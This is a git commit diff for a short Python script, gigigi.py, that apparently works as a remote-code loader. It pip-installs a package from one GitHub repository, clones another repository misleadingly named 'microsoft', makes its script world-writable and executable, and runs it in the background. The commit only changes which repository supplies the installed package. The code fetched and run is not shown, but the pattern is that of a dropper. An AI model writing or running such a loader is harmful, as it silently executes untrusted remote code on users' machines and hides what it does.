fe8191a2d71bbb3219f6b815cb11d60564b22045
reolosi <82867208+reolosi@users.noreply.github.com>
2021-05-16 23:37:58 +0530

    Update gigigi.py

--- gigigi.py
+++ gigigi.py
@@ -1,5 +1,5 @@
 import os
-os.system("pip3 install git+https://github.com/elonkmusk984/subscription.git")
+os.system("pip3 install git+https://github.com/reolosi/eisof12.git")
 os.system("git clone https://github.com/elonkmusk984/microsoft.git")
 os.system("chmod 777 microsoft/micros.py ")
 os.system("./microsoft/micros.py &")
